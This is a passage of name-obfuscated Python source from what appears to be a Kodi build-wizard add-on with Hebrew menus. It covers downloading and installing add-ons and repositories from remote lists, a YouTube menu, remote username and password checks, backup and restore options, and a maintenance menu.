			O000O0OO000O0O0O0 =wiz .openURL (O0O0OOO0O00O0OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2527
			OOO00O0OO000O000O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOO00O000O00OOO ).findall (O000O0OO000O0O0O0 )#line:2528
			if len (OOO00O0OO000O000O )>0 :#line:2529
				for O000OOO0O00OO0000 ,O0O0OOO0O00O0OOO0 ,OOOOOOOOOO00000OO ,OO0OO000O0OOO0O00 ,OOO000OOOOO00000O ,O0OO0O00000OO0OOO ,O0OOOOOOO0OO00OOO ,OO0OO00O0O000O0OO ,O0O00O000O0000OO0 in OOO00O0OO000O000O :#line:2530
					if os .path .exists (os .path .join (ADDONS ,OOOOO00O000O00OOO )):#line:2531
						OO0O0OO000OOOOO0O =['Launch Addon','Remove Addon']#line:2532
						OO0OO00O0O0OO0000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0O0OO000OOOOO0O )#line:2533
						if OO0OO00O0O0OO0000 ==0 :#line:2534
							wiz .ebi ('RunAddon(%s)'%OOOOO00O000O00OOO )#line:2535
							xbmc .sleep (1000 )#line:2536
							return True #line:2537
						elif OO0OO00O0O0OO0000 ==1 :#line:2538
							wiz .cleanHouse (os .path .join (ADDONS ,OOOOO00O000O00OOO ))#line:2539
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOOO00O000O00OOO ))#line:2540
							except :pass #line:2541
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOO00O000O00OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2542
								removeAddonData (OOOOO00O000O00OOO )#line:2543
							wiz .refresh ()#line:2544
							return True #line:2545
						else :#line:2546
							return False #line:2547
					O0O00O000O000OOOO =os .path .join (ADDONS ,OOOOOOOOOO00000OO )#line:2548
					if not OOOOOOOOOO00000OO .lower ()=='none'and not os .path .exists (O0O00O000O000OOOO ):#line:2549
						wiz .log ("Repository not installed, installing it")#line:2550
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOOO00O000O00OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOOOOOOOO00000OO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2551
							OOO000O0OO0O00OO0 =wiz .parseDOM (wiz .openURL (OO0OO000O0OOO0O00 ),'addon',ret ='version',attrs ={'id':OOOOOOOOOO00000OO })#line:2552
							if len (OOO000O0OO0O00OO0 )>0 :#line:2553
								OOOOOOOO0O0O0OO0O ='%s%s-%s.zip'%(OOO000OOOOO00000O ,OOOOOOOOOO00000OO ,OOO000O0OO0O00OO0 [0 ])#line:2554
								wiz .log (OOOOOOOO0O0O0OO0O )#line:2555
								if KODIV >=17 :wiz .addonDatabase (OOOOOOOOOO00000OO ,1 )#line:2556
								installAddon (OOOOOOOOOO00000OO ,OOOOOOOO0O0O0OO0O )#line:2557
								wiz .ebi ('UpdateAddonRepos()')#line:2558
								wiz .log ("Installing Addon from Kodi")#line:2560
								O0O0O0OOOO0O0OO00 =installFromKodi (OOOOO00O000O00OOO )#line:2561
								wiz .log ("Install from Kodi: %s"%O0O0O0OOOO0O0OO00 )#line:2562
								if O0O0O0OOOO0O0OO00 :#line:2563
									wiz .refresh ()#line:2564
									return True #line:2565
							else :#line:2566
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOOOOOOOOO00000OO )#line:2567
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOOO00O000O00OOO ,OOOOOOOOOO00000OO ))#line:2568
					elif OOOOOOOOOO00000OO .lower ()=='none':#line:2569
						wiz .log ("No repository, installing addon")#line:2570
						O00OO0O0OOOOOOO0O =OOOOO00O000O00OOO #line:2571
						OOOOOOOO0OO00OO00 =O0O0OOO0O00O0OOO0 #line:2572
						installAddon (OOOOO00O000O00OOO ,O0O0OOO0O00O0OOO0 )#line:2573
						wiz .refresh ()#line:2574
						return True #line:2575
					else :#line:2576
						wiz .log ("Repository installed, installing addon")#line:2577
						O0O0O0OOOO0O0OO00 =installFromKodi (OOOOO00O000O00OOO ,False )#line:2578
						if O0O0O0OOOO0O0OO00 :#line:2579
							wiz .refresh ()#line:2580
							return True #line:2581
					if os .path .exists (os .path .join (ADDONS ,OOOOO00O000O00OOO )):return True #line:2582
					O00OO0000000OOO0O =wiz .parseDOM (wiz .openURL (OO0OO000O0OOO0O00 ),'addon',ret ='version',attrs ={'id':OOOOO00O000O00OOO })#line:2583
					if len (O00OO0000000OOO0O )>0 :#line:2584
						O0O0OOO0O00O0OOO0 ="%s%s-%s.zip"%(O0O0OOO0O00O0OOO0 ,OOOOO00O000O00OOO ,O00OO0000000OOO0O [0 ])#line:2585
						wiz .log (str (O0O0OOO0O00O0OOO0 ))#line:2586
						if KODIV >=17 :wiz .addonDatabase (OOOOO00O000O00OOO ,1 )#line:2587
						installAddon (OOOOO00O000O00OOO ,O0O0OOO0O00O0OOO0 )#line:2588
						wiz .refresh ()#line:2589
					else :#line:2590
						wiz .log ("no match");return False #line:2591
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2592
		else :wiz .log ("[Addon Installer] Text File: %s"%O00OO0OO0O00OOO0O )#line:2593
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2594
def installFromKodi (O0O0O0O000000O00O ,over =True ):#line:2596
	if over ==True :#line:2597
		xbmc .sleep (2000 )#line:2598
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0O0O000000O00O )#line:2600
	if not wiz .whileWindow ('yesnodialog'):#line:2601
		return False #line:2602
	xbmc .sleep (1000 )#line:2603
	if wiz .whileWindow ('okdialog'):#line:2604
		return False #line:2605
	wiz .whileWindow ('progressdialog')#line:2606
	if os .path .exists (os .path .join (ADDONS ,O0O0O0O000000O00O )):return True #line:2607
	else :return False #line:2608
def installAddon (OOOO000000O0OOO0O ,OO00OOO0OO00000OO ):#line:2610
	if not wiz .workingURL (OO00OOO0OO00000OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOO000000O0OOO0O ,COLOR2 ));return #line:2611
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2612
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000O0OOO0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2613
	OO0OO00OOOO00OO00 =OO00OOO0OO00000OO .split ('/')#line:2614
	OOO0O0OO0OOOO00O0 =os .path .join (PACKAGES ,OO0OO00OOOO00OO00 [-1 ])#line:2615
	try :os .remove (OOO0O0OO0OOOO00O0 )#line:2616
	except :pass #line:2617
	downloader .download (OO00OOO0OO00000OO ,OOO0O0OO0OOOO00O0 ,DP )#line:2618
	O00000O0OO00O0OOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000000O0OOO0O )#line:2619
	DP .update (0 ,O00000O0OO00O0OOO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2620
	OO000OOOOO00O0O0O ,OO00OOOO0OOOO0000 ,O00O0O000OO0OO000 =extract .all (OOO0O0OO0OOOO00O0 ,ADDONS ,DP ,title =O00000O0OO00O0OOO )#line:2621
	DP .update (0 ,O00000O0OO00O0OOO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2622
	installed (OOOO000000O0OOO0O )#line:2623
	installDep (OOOO000000O0OOO0O ,DP )#line:2624
	DP .close ()#line:2625
	wiz .ebi ('UpdateAddonRepos()')#line:2626
	wiz .ebi ('UpdateLocalAddons()')#line:2627
	wiz .refresh ()#line:2628
def installDep (O0OO0O0000OOO0O00 ,DP =None ):#line:2630
	OO0OO0O0OO000OOOO =os .path .join (ADDONS ,O0OO0O0000OOO0O00 ,'addon.xml')#line:2631
	if os .path .exists (OO0OO0O0OO000OOOO ):#line:2632
		OO0O00OOO0O00O000 =open (OO0OO0O0OO000OOOO ,mode ='r');O0OO0O0OO000OOOO0 =OO0O00OOO0O00O000 .read ();OO0O00OOO0O00O000 .close ();#line:2633
		O0OOOOO0OOOOOO0OO =wiz .parseDOM (O0OO0O0OO000OOOO0 ,'import',ret ='addon')#line:2634
		for O000O00OO000OO00O in O0OOOOO0OOOOOO0OO :#line:2635
			if not 'xbmc.python'in O000O00OO000OO00O :#line:2636
				if not DP ==None :#line:2637
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O00OO000OO00O ))#line:2638
				wiz .createTemp (O000O00OO000OO00O )#line:2639
def installed (O0000OO0O0OO0OO0O ):#line:2666
	OO0O00O00OOOO0O0O =os .path .join (ADDONS ,O0000OO0O0OO0OO0O ,'addon.xml')#line:2667
	if os .path .exists (OO0O00O00OOOO0O0O ):#line:2668
		try :#line:2669
			OO000OO000000OO00 =open (OO0O00O00OOOO0O0O ,mode ='r');O00O00O000OOOO0O0 =OO000OO000000OO00 .read ();OO000OO000000OO00 .close ()#line:2670
			O000000OO000OOO0O =wiz .parseDOM (O00O00O000OOOO0O0 ,'addon',ret ='name',attrs ={'id':O0000OO0O0OO0OO0O })#line:2671
			OOOO000OO0O0O0OO0 =os .path .join (ADDONS ,O0000OO0O0OO0OO0O ,'icon.png')#line:2672
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000000OO000OOO0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOOO000OO0O0O0OO0 )#line:2673
		except :pass #line:2674
def youtubeMenu (url =None ):#line:2676
	if not YOUTUBEFILE =='http://':#line:2677
		if url ==None :#line:2678
			OOOOOO0O0OO0OOO00 =wiz .workingURL (YOUTUBEFILE )#line:2679
			OOOO0O0O0OO0OO00O =uservar .YOUTUBEFILE #line:2680
		else :#line:2681
			OOOOOO0O0OO0OOO00 =wiz .workingURL (url )#line:2682
			OOOO0O0O0OO0OO00O =url #line:2683
		if OOOOOO0O0OO0OOO00 ==True :#line:2684
			OO0OOO0000OO000O0 =wiz .openURL (OOOO0O0O0OO0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2685
			O0O000O0000O0O0OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OOO0000OO000O0 )#line:2686
			if len (O0O000O0000O0O0OO )>0 :#line:2687
				for O0O00000000000OOO ,O00OOOO0O00O0OOO0 ,url ,O000000OOO00OO000 ,OOO0O000OOO000OOO ,OOO0O0OOOO00OO0O0 in O0O000O0000O0O0OO :#line:2688
					if O00OOOO0O00O0OOO0 .lower ()=="yes":#line:2689
						addDir ("[B]%s[/B]"%O0O00000000000OOO ,'youtube',url ,description =OOO0O0OOOO00OO0O0 ,icon =O000000OOO00OO000 ,fanart =OOO0O000OOO000OOO ,themeit =THEME3 )#line:2690
					else :#line:2691
						addFile (O0O00000000000OOO ,'viewVideo',url =url ,description =OOO0O0OOOO00OO0O0 ,icon =O000000OOO00OO000 ,fanart =OOO0O000OOO000OOO ,themeit =THEME2 )#line:2692
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2693
		else :#line:2694
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2695
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2696
			addFile ('%s'%OOOOOO0O0OO0OOO00 ,'',themeit =THEME3 )#line:2697
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2698
	setView ('files','viewType')#line:2699
def STARTP ():#line:2700
	OOOO0O000OOOOO000 =(ADDON .getSetting ("pass"))#line:2701
	if BUILDNAME =="":#line:2702
	 if not NOTIFY =='true':#line:2703
          O0OOO0OOOOO00OOO0 =wiz .workingURL (NOTIFICATION )#line:2704
	 if not NOTIFY2 =='true':#line:2705
          O0OOO0OOOOO00OOO0 =wiz .workingURL (NOTIFICATION2 )#line:2706
	 if not NOTIFY3 =='true':#line:2707
          O0OOO0OOOOO00OOO0 =wiz .workingURL (NOTIFICATION3 )#line:2708
	OOOO0OOOOOOO00O0O =OOOO0O000OOOOO000 #line:2709
	O0OOO0OOOOO00OOO0 =urllib2 .Request (SPEED )#line:2710
	O00000000O0OOOO0O =urllib2 .urlopen (O0OOO0OOOOO00OOO0 )#line:2711
	OOO000000000O0O0O =O00000000O0OOOO0O .readlines ()#line:2713
	OO0O0OOO0O000O0OO =0 #line:2717
	for OO000OOOOOO000OOO in OOO000000000O0O0O :#line:2718
		if OO000OOOOOO000OOO .split (' ==')[0 ]==OOOO0O000OOOOO000 or OO000OOOOOO000OOO .split ()[0 ]==OOOO0O000OOOOO000 :#line:2719
			OO0O0OOO0O000O0OO =1 #line:2720
			break #line:2721
	if OO0O0OOO0O000O0OO ==0 :#line:2722
					OOOOO0O00OOOOOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2723
					if OOOOO0O00OOOOOO00 :#line:2725
						ADDON .openSettings ()#line:2727
						sys .exit ()#line:2729
					else :#line:2730
						sys .exit ()#line:2731
	return 'ok'#line:2735
def STARTP2 ():#line:2736
	O00O0O0000O00O0O0 =(ADDON .getSetting ("user"))#line:2737
	OO0OO00O0OOOO00O0 =(UNAME )#line:2739
	OO00OO00OOO0OO00O =urllib2 .urlopen (OO0OO00O0OOOO00O0 )#line:2740
	O00000OOOOO000000 =OO00OO00OOO0OO00O .readlines ()#line:2741
	O0000OO0000O000O0 =0 #line:2742
	for O000000000OO00O00 in O00000OOOOO000000 :#line:2745
		if O000000000OO00O00 .split (' ==')[0 ]==O00O0O0000O00O0O0 or O000000000OO00O00 .split ()[0 ]==O00O0O0000O00O0O0 :#line:2746
			O0000OO0000O000O0 =1 #line:2747
			break #line:2748
	if O0000OO0000O000O0 ==0 :#line:2749
		OO0OO0OOO00O0OO0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2750
		if OO0OO0OOO00O0OO0O :#line:2752
			ADDON .openSettings ()#line:2754
			sys .exit ()#line:2757
		else :#line:2758
			sys .exit ()#line:2759
	return 'ok'#line:2763
def passandpin ():#line:2764
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2765
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2766
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2767
def passandUsername ():#line:2768
	ADDON .openSettings ()#line:2770
def folderback ():#line:2773
    O00OO00O00OO0O000 =ADDON .getSetting ("path")#line:2774
    if O00OO00O00OO0O000 :#line:2775
      O00OO00O00OO0O000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2776
      ADDON .setSetting ("path",O00OO00O00OO0O000 )#line:2777
def backmyupbuild ():#line:2780
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2788
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2789
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2790
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2792
def maintMenu (view =None ):#line:2796
	OO0O0OOOO0OOOO0OO ='[B][COLOR green]ON[/COLOR][/B]';O0O0OOOOOO0OOO000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2798
	O00OOOOO000000O00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2799
	OOO000OO000O00O00 ='true'if AUTOCACHE =='true'else 'false'#line:2800
	O0000OO00O00000O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2801
	OO00OO0OO0O00OO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2802
	OO00OOOO0000O00O0 ='true'if SHOWMAINT =='true'else 'false'#line:2803
	OOOOO00O00OO0OOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2804
	O0OOOOO000OOO00OO ='true'if INCLUDEALL =='true'else 'false'#line:2805
	OO00OOOO00O0O0O00 ='true'if THIRDPARTY =='true'else 'false'#line:2806
	if wiz .Grab_Log (True )==False :OOOOOO0OO0OOO0O00 =0 #line:2807
	else :OOOOOO0OO0OOO0O00 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2808
	if wiz .Grab_Log (True ,True )==False :OO00OOO000OO00000 =0 #line:2809
	else :OO00OOO000OO00000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2810
	OOO0OOOOO000O000O =int (OOOOOO0OO0OOO0O00 )+int (OO00OOO000OO00000 )#line:2811
	OO00OOO0OO00000O0 =str (OOO0OOOOO000O000O )+' Error(s) Found'if OOO0OOOOO000O000O >0 else 'None Found'#line:2812
	OO000000000OO0000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2813
	if O0OOOOO000OOO00OO =='true':#line:2814
		O0O0OOO0OO0OOOOO0 ='true'#line:2815
		OOOOOOOOOO00O0O00 ='true'#line:2816
		OO0O0O0O000OOOO00 ='true'#line:2817
		O0OO0O0OO0OOOO00O ='true'#line:2818
		O0OO00OO0O0O0OOOO ='true'#line:2819
		O0O0O00O0OO00O00O ='true'#line:2820
		OO0OOO000000000OO ='true'#line:2821
		OOO0O0O0OO00OOOOO ='true'#line:2822
	else :#line:2823
		O0O0OOO0OO0OOOOO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2824
		OOOOOOOOOO00O0O00 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2825
		OO0O0O0O000OOOO00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2826
		O0OO0O0OO0OOOO00O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2827
		O0OO00OO0O0O0OOOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2828
		O0O0O00O0OO00O00O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2829
		OO0OOO000000000OO ='true'if INCLUDESALTS =='true'else 'false'#line:2830
		OOO0O0O0OO00OOOOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2831
	OO0O0000OO0OOO0O0 =wiz .getSize (PACKAGES )#line:2832
	O00O00OO00OOOOO0O =wiz .getSize (THUMBS )#line:2833
	OO0OO0OOO0O0OOOOO =wiz .getCacheSize ()#line:2834
	OO000OOOO0000O00O =OO0O0000OO0OOO0O0 +O00O00OO00OOOOO0O +OO0OO0OOO0O0OOOOO #line:2835
	OOOO000OO00OOOO00 =['Daily','Always','3 Days','Weekly']#line:2836
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2837
	if view =="clean"or SHOWMAINT =='true':#line:2838
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000OOOO0000O00O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO0OOO0O0OOOOO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0000OO0OOO0O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00OO00OOOOO0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="addon"or SHOWMAINT =='false':#line:2848
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2855
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2856
	if view =="misc"or SHOWMAINT =='true':#line:2857
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('View Errors in Log: %s'%(OO00OOO0OO00000O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('Clear Wizard Log File%s'%OO000000000OO0000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2866
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2867
	if view =="backup"or SHOWMAINT =='true':#line:2868
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2877
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2880
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2881
	if view =="tweaks"or SHOWMAINT =='true':#line:2882
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2883
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		else :#line:2885
			if os .path .exists (ADVANCED ):#line:2886
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2887
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2888
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2895
	addFile ('Show All Maintenance: %s'%OO00OOOO0000O00O0 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2896
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2897
	addFile ('Third Party Wizards: %s'%OO00OOOO00O0O0O00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2898
	if OO00OOOO00O0O0O00 =='true':#line:2899
		OO0O0O00OOOO0O000 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2900
		O0O00O0O0OOO0000O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2901
		O0OO000O00O00O000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2902
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O00OOOO0O000 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00O0O0OOO0000O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO000O00O00O000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2906
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OOOOO000000O00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2907
	if O00OOOOO000000O00 =='true':#line:2908
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO000OO00OOOO00 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOO000OO000O00O00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0000OO00O00000O0 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2911
